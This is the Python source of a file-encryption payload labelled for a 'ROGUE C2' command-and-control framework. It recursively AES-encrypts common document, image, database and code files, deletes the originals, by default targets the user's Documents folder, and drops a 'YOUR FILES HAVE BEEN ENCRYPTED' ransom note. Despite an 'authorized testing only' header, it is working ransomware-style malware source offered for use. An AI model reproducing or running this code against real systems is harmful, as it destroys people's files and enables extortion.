#!/usr/bin/env python3
"""
PAYLOAD: File Encryption/Decryption
DESCRIPTION: Encrypt/decrypt files with password protection
INTEGRATION: ROGUE C2 Framework - Use via trigger_fileransom
AUTHOR: Rogue Red Team
VERSION: 1.0
SECURITY: For authorized testing only - NEVER use for illegal activities
"""
import os, sys, hashlib, json, base64, random, string, time, argparse
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from Cryptodome.Protocol.KDF import PBKDF2

class FileEncryptor:
    def __init__(self, password=None):
        self.password = password or self.generate_password()
        self.salt = get_random_bytes(16)
        self.key = self.derive_key(self.password, self.salt)
        self.encrypted_files = []
        self.decrypted_files = []
        
    def generate_password(self, length=32):
        """Generate strong password"""
        chars = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choice(chars) for _ in range(length))
    
    def derive_key(self, password, salt):
        """Derive encryption key from password"""
        return PBKDF2(password, salt, dkLen=32, count=1000000)
    
    def encrypt_file(self, filepath):
        """Encrypt a single file"""
        try:
            # Read file
            with open(filepath, 'rb') as f:
                plaintext = f.read()
            
            # Generate IV and encrypt
            iv = get_random_bytes(16)
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            
            # Pad plaintext
            pad_length = 16 - (len(plaintext) % 16)
            plaintext += bytes([pad_length]) * pad_length
            
            ciphertext = cipher.encrypt(plaintext)
            
            # Save encrypted file
            encrypted_path = filepath + '.encrypted'
            with open(encrypted_path, 'wb') as f:
                f.write(iv + self.salt + ciphertext)
            
            # Remove original
            os.remove(filepath)
            
            self.encrypted_files.append({
                'original': filepath,
                'encrypted': encrypted_path,
                'timestamp': time.time()
            })
            
            return True
            
        except Exception as e:
            print(f"[!] Failed to encrypt {filepath}: {e}")
            return False
    
    def decrypt_file(self, encrypted_path, output_path=None):
        """Decrypt a file"""
        try:
            if not output_path:
                output_path = encrypted_path.replace('.encrypted', '')
            
            # Read encrypted file
            with open(encrypted_path, 'rb') as f:
                data = f.read()
            
            iv = data[:16]
            salt = data[16:32]
            ciphertext = data[32:]
            
            # Re-derive key
            key = self.derive_key(self.password, salt)
            
            # Decrypt
            cipher = AES.new(key, AES.MODE_CBC, iv)
            plaintext = cipher.decrypt(ciphertext)
            
            # Remove padding
            pad_length = plaintext[-1]
            plaintext = plaintext[:-pad_length]
            
            # Write decrypted file
            with open(output_path, 'wb') as f:
                f.write(plaintext)
            
            # Remove encrypted file
            os.remove(encrypted_path)
            
            self.decrypted_files.append({
                'encrypted': encrypted_path,
                'decrypted': output_path,
                'timestamp': time.time()
            })
            
            return True
            
        except Exception as e:
            print(f"[!] Failed to decrypt {encrypted_path}: {e}")
            return False
    
    def encrypt_directory(self, directory, extensions=None):
        """Encrypt all files in directory"""
        if not extensions:
            extensions = ['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx',
                         '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.zip', '.tar', '.gz',
                         '.sql', '.db', '.csv', '.xml', '.json', '.yml', '.yaml',
                         '.py', '.js', '.html', '.css', '.php', '.java', '.cpp', '.c']
        
        encrypted_count = 0
        total_count = 0
        
        for root, dirs, files in os.walk(directory):
            for file in files:
                if any(file.lower().endswith(ext.lower()) for ext in extensions):
                    filepath = os.path.join(root, file)
                    total_count += 1
                    
                    try:
                        if self.encrypt_file(filepath):
                            encrypted_count += 1
                    except Exception as e:
                        print(f"[!] Error with {filepath}: {e}")
        
        return encrypted_count, total_count
    
    def create_ransom_note(self, directory):
        """Create README_FOR_DECRYPT.txt with instructions"""
        note_content = f"""=============================================
 YOUR FILES HAVE BEEN ENCRYPTED
=============================================

Your important files have been encrypted with military-grade AES-256 encryption.

To decrypt your files, you need the decryption password.

Password: {self.password}

=============================================
 INSTRUCTIONS FOR DECRYPTION
=============================================

1. Save this password securely
2. Run the decryption tool with this password
3. All files with .encrypted extension will be restored

=============================================
 WARNING
=============================================
- Do NOT modify or delete .encrypted files
- Do NOT attempt to decrypt without the password
- Keep this file for reference

Generated: {time.ctime()}
Encryption ID: {hashlib.md5(self.password.encode()).hexdigest()[:8]}
============================================="""
        
        note_path = os.path.join(directory, "README_FOR_DECRYPT.txt")
        with open(note_path, 'w') as f:
            f.write(note_content)
        
        # Also create recovery script
        recovery_script = f"""#!/bin/bash
# Recovery script for encrypted files
echo "Starting file recovery..."
echo "Using password: {self.password}"
python3 -c "
import os, sys, hashlib, base64
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2

def derive_key(password, salt):
    return PBKDF2(password, salt, dkLen=32, count=1000000)

password = '{self.password}'
for root, dirs, files in os.walk('.'):
    for file in files:
        if file.endswith('.encrypted'):
            filepath = os.path.join(root, file)
            try:
                with open(filepath, 'rb') as f:
                    data = f.read()
                iv = data[:16]
                salt = data[16:32]
                ciphertext = data[32:]
                key = derive_key(password, salt)
                cipher = AES.new(key, AES.MODE_CBC, iv)
                plaintext = cipher.decrypt(ciphertext)
                pad_length = plaintext[-1]
                plaintext = plaintext[:-pad_length]
                output_path = filepath.replace('.encrypted', '')
                with open(output_path, 'wb') as f:
                    f.write(plaintext)
                os.remove(filepath)
                print(f'[+] Restored: {{output_path}}')
            except Exception as e:
                print(f'[!] Failed: {{filepath}} - {{e}}')
"
echo "Recovery complete!"
"""
        
        script_path = os.path.join(directory, "recover_files.sh")
        with open(script_path, 'w') as f:
            f.write(recovery_script)
        os.chmod(script_path, 0o755)
        
        return note_path
    
    def execute_encryption(self, target_path=None):
        """Main encryption execution"""
        try:
            if not target_path:
                target_path = os.path.expanduser("~/Documents")
            
            print(f"[+] Starting encryption of: {target_path}")
            print(f"[+] Encryption password: {self.password}")
            
            if os.path.isfile(target_path):
                success = self.encrypt_file(target_path)
                if success:
                    result = f"Encrypted 1/1 files"
                else:
                    result = "Encryption failed"
            else:
                encrypted, total = self.encrypt_directory(target_path)
                result = f"Encrypted {encrypted}/{total} files"
            
            # Create ransom note
            if os.path.isdir(target_path):
                note_path = self.create_ransom_note(target_path)
                print(f"[+] Ransom note created: {note_path}")
            
            # Save encryption log
            log_data = {
                'password': self.password,
                'salt': base64.b64encode(self.salt).decode(),
                'encrypted_files': self.encrypted_files,
                'target': target_path,
                'timestamp': time.time(),
                'result': result
            }
            
            log_dir = os.path.expanduser("~/.cache/.rogue")
            os.makedirs(log_dir, exist_ok=True)
            log_path = os.path.join(log_dir, "encryption_log.json")
            
            with open(log_path, 'w') as f:
                json.dump(log_data, f, indent=2)
            
            return f"""[+] Encryption complete
{result}
[+] Password: {self.password}
[+] Note: Password saved to {log_path}"""
            
        except Exception as e:
            return f"[!] Encryption failed: {e}"
    
    def execute_decryption(self, target_path=None, password=None):
        """Main decryption execution"""
        try:
            if not target_path:
                # Look for encrypted files in common locations
                possible_paths = [
                    os.path.expanduser("~/Documents"),
                    os.path.expanduser("~/Downloads"),
                    os.path.expanduser("~/Desktop"),
                    os.path.expanduser("~/Pictures")
                ]
                
                for path in possible_paths:
                    if os.path.exists(path):
                        target_path = path
                        break
                
                if not target_path:
                    target_path = "."
            
            if not password:
                # Try to load password from log
                log_path = os.path.expanduser("~/.cache/.rogue/encryption_log.json")
                if os.path.exists(log_path):
                    with open(log_path, 'r') as f:
                        log_data = json.load(f)
                    password = log_data.get('password')
                
                if not password:
                    return "[!] No password provided and no log found"
            
            # Set the password
            self.password = password
            self.salt = get_random_bytes(16)  # Will be overridden by file salt
            self.key = self.derive_key(self.password, self.salt)
            
            print(f"[+] Starting decryption of: {target_path}")
            print(f"[+] Using password: {password[:10]}...")
            
            decrypted_count = 0
            total_count = 0
            
            for root, dirs, files in os.walk(target_path):
                for file in files:
                    if file.endswith('.encrypted'):
                        filepath = os.path.join(root, file)
                        total_count += 1
                        
                        try:
                            if self.decrypt_file(filepath):
                                decrypted_count += 1
                        except Exception as e:
                            print(f"[!] Failed to decrypt {filepath}: {e}")
            
            # Remove ransom note if it exists
            note_path = os.path.join(target_path, "README_FOR_DECRYPT.txt")
            if os.path.exists(note_path):
                os.remove(note_path)
            
            # Remove recovery script if it exists
            script_path = os.path.join(target_path, "recover_files.sh")
            if os.path.exists(script_path):
                os.remove(script_path)
            
            return f"[+] Decryption complete: {decrypted_count}/{total_count} files restored"
            
        except Exception as e:
            return f"[!] Decryption failed: {e}"

# === ROGUE C2 INTEGRATION ===
def rogue_integration(args=None):
    """Main entry point for ROGUE C2 integration"""
    if args is None:
        # Parse command line arguments
        parser = argparse.ArgumentParser(description='File Encryption/Decryption for ROGUE C2')
        parser.add_argument('action', choices=['encrypt', 'decrypt'], help='Action to perform')
        parser.add_argument('target', nargs='?', default=None, help='Target file or directory')
        parser.add_argument('--password', '-p', default=None, help='Password for decryption')
        parser.add_argument('--custom-password', '-c', default=None, help='Custom password for encryption')
        
        args = parser.parse_args()
    
    if args.action == 'encrypt':
        if args.custom_password:
            encryptor = FileEncryptor(args.custom_password)
        else:
            encryptor = FileEncryptor()
        
        result = encryptor.execute_encryption(args.target)
        return result
    
    elif args.action == 'decrypt':
        if not args.password:
            return "[!] Password required for decryption. Use --password option"
        
        encryptor = FileEncryptor(args.password)
        result = encryptor.execute_decryption(args.target, args.password)
        return result

# === For standalone testing ===
def main():
    """Standalone execution for testing"""
    print("=" * 60)
    print("ROGUE File Encryption Payload - STANDALONE TEST MODE")
    print("=" * 60)
    print("[!] WARNING: This is a destructive payload!")
    print("[!] Only use in isolated test environments!")
    print("=" * 60)
    
    if len(sys.argv) > 1:
        # Parse arguments from command line
        result = rogue_integration()
        print(result)
    else:
        # Interactive mode
        print("\nSelect mode:")
        print("1. Encrypt files (test in /tmp)")
        print("2. Decrypt files")
        print("3. Exit")
        
        choice = input("\nEnter choice (1-3): ").strip()
        
        if choice == '1':
            # Test encryption in /tmp directory
            test_dir = "/tmp/test_rogue_encryption"
            os.makedirs(test_dir, exist_ok=True)
            
            # Create test files
            for i in range(5):
                with open(os.path.join(test_dir, f"test_document_{i}.txt"), 'w') as f:
                    f.write(f"This is test document #{i}\n")
                    f.write(f"Created: {time.ctime()}\n")
                    f.write(f"Test content for encryption payload\n")
            
            print(f"\n[+] Created test directory: {test_dir}")
            print("[+] Starting encryption test...")
            
            encryptor = FileEncryptor()
            result = encryptor.execute_encryption(test_dir)
            print(f"\n{result}")
            
            print(f"\n[+] Test complete!")
            print(f"[+] Check: {test_dir}")
            print(f"[+] Password was: {encryptor.password}")
            
        elif choice == '2':
            password = input("Enter decryption password: ").strip()
            if not password:
                print("[!] Password required!")
                return
            
            target = input("Enter target path [default: current directory]: ").strip()
            if not target:
                target = "."
            
            encryptor = FileEncryptor(password)
            result = encryptor.execute_decryption(target, password)
            print(f"\n{result}")
        
        else:
            print("[*] Exiting...")

if __name__ == "__main__":
    # When run directly, use main()
    main()
else:
    # When imported by ROGUE C2, provide integration function
    pass
